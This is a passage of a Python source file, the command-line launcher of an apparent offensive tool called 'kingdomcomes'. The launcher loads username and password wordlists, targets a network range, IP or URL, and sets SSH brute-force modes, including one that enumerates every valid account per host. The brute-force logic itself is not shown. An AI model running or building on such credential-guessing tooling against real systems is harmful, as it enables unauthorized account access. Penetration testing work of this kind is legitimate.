  python kingdomcomes.py -t 192.168.1.0/24 --verbose -o results.txt
  python kingdomcomes.py -t 192.168.1.5 -u users.txt -w passwords.txt --find-all -o full_report.txt

WARNING: For authorized testing only. Illegal use prohibited.
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        "-t",
        "--target",
        help=(
            "Target network range (192.168.1.0/24), single IP (192.168.1.1), "
            "or URL (http://example.com)"
        ),
    )
    parser.add_argument(
        "-w",
        "--wordlist",
        help=(
            "Password wordlist file (e.g., rockyou.txt). "
            "Processed sequentially."
        ),
    )
    parser.add_argument(
        "-u",
        "--usernames",
        help="Username wordlist file. Processed sequentially.",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Export results to specified file",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable verbose/debug output",
    )
    parser.add_argument(
        "--test-creds",
        action="store_true",
        help=(
            "Quick test mode: only test first username/password combination "
            "(useful for debugging)"
        ),
    )
    parser.add_argument(
        "--find-all",
        action="store_true",
        help=(
            "During SSH brute force, continue after the first valid account "
            "to find all valid credentials per host"
        ),
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable ANSI colors in output (useful for logs or plain terminals)",
    )

    args = parser.parse_args()

    # Handle colors
    if args.no_color:
        Config.USE_COLORS = False
        Colors.disable()

    # Set verbose mode
    if args.verbose:
        Config.VERBOSE = True

    # Set test mode
    if args.test_creds:
        Config.TEST_CREDS = True
        Display.info(
            f"{Colors.YELLOW}TEST MODE ENABLED{Colors.RESET} - "
            f"Will only test first credential combination"
        )

    # Set find-all mode
    if args.find_all:
        Config.FIND_ALL = True
        Display.info(
            f"{Colors.YELLOW}FIND-ALL MODE ENABLED{Colors.RESET} - "
            f"Will enumerate all valid SSH accounts per host"
        )

    # Display banner
    Display.banner()

    # Prompt for target if not provided
    if args.target:
        Config.TARGET_NETWORK = args.target
        Display.info(
            f"Target loaded from arguments: "
            f"{Colors.BOLD}{args.target}{Colors.RESET}"
        )
    else:
        target_input = input(
            f"\n{Colors.PROMPT} Enter target network, IP, or URL "
            f"(default: {Config.TARGET_NETWORK}): {Colors.RESET}"
        ).strip()
        if target_input:
            Config.TARGET_NETWORK = target_input

    # Load usernames
    if args.usernames:
        if os.path.exists(args.usernames):
            with open(
                args.usernames, "r", encoding="utf-8", errors="ignore"
            ) as f:
                Config.USERNAMES = [
                    line.strip() for line in f if line.strip()
                ]
            Display.info(
                f"Loaded {Colors.BOLD}{len(Config.USERNAMES)}{Colors.RESET} "
                f"usernames from {args.usernames}"
            )
        else:
            Display.error(f"Usernames file not found: {args.usernames}")
            sys.exit(1)
    else:
        usernames_input = input(
            f"{Colors.PROMPT} Enter usernames (comma-separated or file path) "
            f"[default]: {Colors.RESET}"
        ).strip()
        if usernames_input:
            if os.path.exists(usernames_input):
                with open(
                    usernames_input,
                    "r",
                    encoding="utf-8",
                    errors="ignore",
                ) as f:
                    Config.USERNAMES = [
                        line.strip() for line in f if line.strip()
                    ]
                Display.info(
                    f"Loaded {len(Config.USERNAMES)} usernames from "
                    f"{usernames_input}"
                )
            else:
                Config.USERNAMES = [
                    u.strip()
                    for u in usernames_input.split(",")
                    if u.strip()
                ]

    # Load passwords
    if args.wordlist:
        if os.path.exists(args.wordlist):
            with open(
                args.wordlist, "r", encoding="utf-8", errors="ignore"
            ) as f:
                Config.PASSWORDS = [
                    line.strip() for line in f if line.strip()
                ]
            Display.info(
                f"Loaded {Colors.BOLD}{len(Config.PASSWORDS)}{Colors.RESET} "
                f"passwords from {args.wordlist}"
            )
        else:
            Display.error(f"Wordlist file not found: {args.wordlist}")
            sys.exit(1)
    else:
        passwords_input = input(
            f"{Colors.PROMPT} Enter passwords (comma-separated or file path) "
            f"[default]: {Colors.RESET}"
        ).strip()
        if passwords_input:
            if os.path.exists(passwords_input):
                with open(
                    passwords_input,
                    "r",
                    encoding="utf-8",
                    errors="ignore",
                ) as f:
                    Config.PASSWORDS = [
                        line.strip() for line in f if line.strip()
                    ]
                Display.info(
                    f"Loaded {len(Config.PASSWORDS)} passwords from "
                    f"{passwords_input}"
                )
            else:
                Config.PASSWORDS = [
                    p.strip()
                    for p in passwords_input.split(",")
                    if p.strip()
                ]

    # Set output file
    if args.output:
        Config.OUTPUT_FILE = args.output

    # Confirmation prompt
    print()
    Display.warning("You are about to initiate a penetration test")
    Display.prompt(
        f"Target: {Colors.BOLD}{Config.TARGET_NETWORK}{Colors.RESET}"
    )
    Display.prompt(
        f"Usernames: {Colors.BOLD}{len(Config.USERNAMES)} entries{Colors.RESET} - "
        f"{', '.join(Config.USERNAMES[:3])}"
        f"{'...' if len(Config.USERNAMES) > 3 else ''}"
    )
    Display.prompt(
        f"Passwords: {Colors.BOLD}{len(Config.PASSWORDS)} entries{Colors.RESET}"
    )
    if Config.OUTPUT_FILE:
        Display.prompt(
            f"Output file: {Colors.BOLD}{Config.OUTPUT_FILE}{Colors.RESET}"
        )
    if Config.VERBOSE:
        Display.prompt(f"Verbose mode: {Colors.BOLD}ENABLED{Colors.RESET}")
    if Config.TEST_CREDS:
        Display.prompt(
            f"Test mode: {Colors.BOLD}{Colors.YELLOW}ENABLED "
            f"(Only first combo will be tested){Colors.RESET}"
        )
    if Config.FIND_ALL:
        Display.prompt(
            f"SSH brute-force mode: {Colors.BOLD}FIND ALL accounts (--find-all)"
            f"{Colors.RESET}"
        )
    else:
        Display.prompt(
            f"SSH brute-force mode: {Colors.BOLD}STOP AFTER FIRST VALID ACCOUNT"
            f"{Colors.RESET}"
        )

    response = input(
        f"\n  {Colors.YELLOW}Continue? (yes/no):{Colors.RESET} "
    ).strip().lower()
    if response not in ["yes", "y"]:
        Display.info("Operation cancelled by user")
        sys.exit(0)

    print()

    try:
        kingdom = KingdomComes()
        kingdom.run()

        # Export results if requested
        if Config.OUTPUT_FILE:
            try:
                with open(
                    Config.OUTPUT_FILE, "w", encoding="utf-8"
                ) as f:
                    for line in kingdom.report_lines:
                        f.write(strip_ansi(line) + "\n")
                Display.success(
                    f"Results exported to "
                    f"{Colors.BOLD}{Config.OUTPUT_FILE}{Colors.RESET}"
                )
            except Exception as e:
                Display.error(f"Failed to export results: {e}")

    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING} Operation interrupted by user")
        print(
            f"{Colors.INFO} Terminating all active connections..."
            f"{Colors.RESET}\n"
        )
    except Exception as e:
        print(f"\n\n{Colors.ERROR} Fatal error occurred: {e}")
        print(
            f"{Colors.INFO} Please report this issue to Ilay Malki"
            f"{Colors.RESET}\n"
        )
        if Config.VERBOSE:
            import traceback

            traceback.print_exc()


if __name__ == "__main__":
    main()
